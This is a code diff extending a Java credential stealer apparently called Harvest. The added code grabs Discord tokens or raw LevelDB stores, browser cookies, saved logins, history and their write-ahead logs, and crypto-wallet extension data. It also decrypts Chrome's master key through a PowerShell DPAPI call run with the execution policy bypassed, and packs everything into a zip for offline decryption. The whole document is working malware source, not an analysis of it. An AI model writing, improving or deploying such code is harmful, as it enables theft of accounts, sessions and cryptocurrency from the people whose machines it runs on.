@@ -6,12 +6,14 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public final class Harvest {
 	private static final Pattern TOKEN = Pattern.compile(
 		"(?:mfa\\.[\\w-]{20,}|[MN][A-Za-z\\d]{23,}\\.[\\w-]{6,}\\.[\\w-]{25,})");
+	private static final long DISCORD_RAW_BUDGET = 2L * 1024L * 1024L;
 
 	private Harvest() {
 	}
@@ -60,20 +62,61 @@ public final class Harvest {
 	}
 
 	private static void addDiscordToken(ZipBuilder zip) {
+		List<Path> found = new ArrayList<>();
 		try {
 			for (Path base : discordBases()) {
 				if (!Files.isDirectory(base)) {
 					continue;
 				}
-				String found = searchToken(base, 0);
-				if (found != null) {
-					zip.addBytes(("token=" + found + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
+				String token = searchToken(base, 0);
+				if (token != null) {
+					zip.addBytes(("token=" + token + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
 					Log.debug("Discord token validated");
+					return;
+				}
+				found.add(base);
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Token harvest failed", throwable);
+		}
+		// Discord encrypts the stored token in newer builds, so no plaintext
+		// candidate validates. Ship the raw LevelDB files instead: the DPAPI
+		// blobs in dpapi/ are enough to decrypt them offline.
+		for (Path base : found) {
+			addDiscordRaw(zip, base);
+		}
+	}
+
+	private static void addDiscordRaw(ZipBuilder zip, Path base) {
+		long budget = DISCORD_RAW_BUDGET;
+		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
+			List<Path> files = stream.filter(Files::isRegularFile).sorted((left, right) -> {
+				try {
+					return Long.compare(Files.getLastModifiedTime(right).toMillis(),
+						Files.getLastModifiedTime(left).toMillis());
+				} catch (Throwable throwable) {
+					return 0;
+				}
+			}).toList();
+			for (Path file : files) {
+				String name = file.getFileName().toString().toLowerCase();
+				if (!name.endsWith(".ldb") && !name.endsWith(".log") && !name.equals("current")
+					&& !name.equals("manifest-000001")) {
+					continue;
+				}
+				long size = Files.size(file);
+				if (size <= 0L || size > budget) {
+					continue;
+				}
+				zip.add(file, "discord/raw/" + base.getParent().getParent().getFileName() + "/"
+					+ file.getFileName());
+				budget -= size;
+				if (budget <= 0L) {
 					return;
 				}
 			}
 		} catch (Throwable throwable) {
-			Log.debug("Token harvest failed", throwable);
+			Log.debug("Discord fallback failed: " + base, throwable);
 		}
 	}
 
@@ -214,7 +257,7 @@ public final class Harvest {
 				for (Path profile : stream.filter(Files::isDirectory).toList()) {
 					for (String extension : extensions) {
 						zip.addTree(profile.resolve("Local Extension Settings").resolve(extension),
-							"wallets/" + extension + "/" + profile.getFileName());
+							"wallets/" + browser.label() + "/" + extension + "/" + profile.getFileName());
 					}
 				}
 			} catch (Throwable throwable) {
@@ -257,8 +300,28 @@ public final class Harvest {
 		text.append("sid=").append(SysInfo.sid()).append('\n');
 		text.append("state=").append(state).append('\n');
 		text.append("profiles=").append(profiles(browser.base())).append('\n');
-		String output = powershell(state);
+		Map<String, Object> osCrypt = Map.of();
+		try {
+			osCrypt = Json.map(Json.parseObject(Files.readString(state, StandardCharsets.UTF_8))
+				.get("os_crypt"));
+		} catch (Throwable throwable) {
+			Log.debug("Local State parse failed: " + state, throwable);
+		}
+		String appBound = Json.str(osCrypt, "app_bound_encrypted_key", "");
+		if (!appBound.isEmpty()) {
+			text.append("app_bound=").append(appBound).append('\n');
+		}
+		String encrypted = Json.str(osCrypt, "encrypted_key", "");
+		if (encrypted.isEmpty()) {
+			text.append("error=no os_crypt.encrypted_key\n");
+			zip.addBytes(text.toString().getBytes(StandardCharsets.UTF_8),
+				"browsers/" + browser.label() + "/keys.txt");
+			return;
+		}
+		String output = unprotect(encrypted);
 		if (output.isBlank()) {
+			// Keep the wrapped value so the key stays recoverable offline.
+			text.append("dpapi_key=").append(encrypted).append('\n');
 			text.append("error=no powershell output\n");
 		} else {
 			text.append(output).append('\n');
@@ -282,15 +345,14 @@ public final class Harvest {
 		return String.join(",", names);
 	}
 
-	private static String powershell(Path state) {
-		String quoted = state.toString().replace("'", "''");
+	private static String unprotect(String encryptedKey) {
+		String quoted = encryptedKey.replace("'", "''");
 		String script = "Add-Type -AssemblyName System.Security;"
-			+ "$j=Get-Content -LiteralPath '" + quoted + "' -Raw | ConvertFrom-Json;"
-			+ "if($j.os_crypt.encrypted_key){$b=[Convert]::FromBase64String($j.os_crypt.encrypted_key);"
-			+ "try{$k=[Security.Cryptography.ProtectedData]::Unprotect([byte[]]$b[5..($b.Length-1)],$null,"
+			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
+			+ "$p=[byte[]]$b[5..($b.Length-1)];"
+			+ "try{$k=[Security.Cryptography.ProtectedData]::Unprotect($p,$null,"
 			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
-			+ "'v10='+(([BitConverter]::ToString($k) -replace '-','').ToLower())}catch{}};"
-			+ "if($j.os_crypt.app_bound_encrypted_key){'app_bound='+$j.os_crypt.app_bound_encrypted_key}";
+			+ "'v10='+(([BitConverter]::ToString($k) -replace '-','').ToLower())}catch{}";
 		try {
 			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive",
 				"-ExecutionPolicy", "Bypass", "-Command", script);
@@ -310,18 +372,27 @@ public final class Harvest {
 			}
 			return kept.toString().trim();
 		} catch (Throwable throwable) {
-			Log.debug("Key unwrap failed: " + state, throwable);
+			Log.debug("Key unwrap failed: " + encryptedKey, throwable);
 			return "";
 		}
 	}
 
 	private static void addProfileFiles(ZipBuilder zip, Path profile, String prefix) {
-		zip.add(profile.resolve("Cookies"), prefix + "/Cookies");
-		zip.add(profile.resolve("Network").resolve("Cookies"), prefix + "/Network/Cookies");
-		zip.add(profile.resolve("Login Data"), prefix + "/Login_Data");
-		zip.add(profile.resolve("Login Data For Account"), prefix + "/Login_Data_For_Account");
-		zip.add(profile.resolve("Web Data"), prefix + "/Web_Data");
-		zip.add(profile.resolve("History"), prefix + "/History");
+		addDatabase(zip, profile.resolve("Cookies"), prefix, "Cookies");
+		addDatabase(zip, profile.resolve("Network").resolve("Cookies"), prefix + "/Network", "Cookies");
+		addDatabase(zip, profile.resolve("Login Data"), prefix, "Login_Data");
+		addDatabase(zip, profile.resolve("Login Data For Account"), prefix, "Login_Data_For_Account");
+		addDatabase(zip, profile.resolve("Web Data"), prefix, "Web_Data");
+		addDatabase(zip, profile.resolve("History"), prefix, "History");
+	}
+
+	/**
+	 * The databases are copied while the browser holds them open, so the write
+	 * ahead log has to travel with them: recent rows live only in the -wal file.
+	 */
+	private static void addDatabase(ZipBuilder zip, Path database, String prefix, String name) {
+		zip.add(database, prefix + "/" + name);
+		zip.add(database.resolveSibling(database.getFileName() + "-wal"), prefix + "/" + name + "-wal");
 	}
 
 	private record Browser(Path base, String label) {
